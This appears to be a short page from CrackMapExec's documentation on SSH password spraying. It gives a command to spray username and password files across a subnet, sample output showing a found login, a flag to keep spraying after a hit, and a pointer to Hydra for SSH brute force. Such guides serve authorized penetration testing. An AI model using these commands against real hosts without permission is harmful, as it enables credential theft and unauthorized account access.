# Password Spraying

### Password spraying (without bruteforce)

```
#~ cme ssh 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```

Expected Results:

```
SSH         127.0.0.1       22     127.0.0.1        [*] SSH-2.0-OpenSSH_8.2p1 Debian-4
SSH         127.0.0.1       22     127.0.0.1        [+] user:password
```

{% hint style="info" %}
By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. Usefull for spraying a single password against a large user list.
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

You can also use [Hydra](https://github.com/vanhauser-thc/thc-hydra) available by default on Kali to bruteforce SSH password, it's faster and better :)
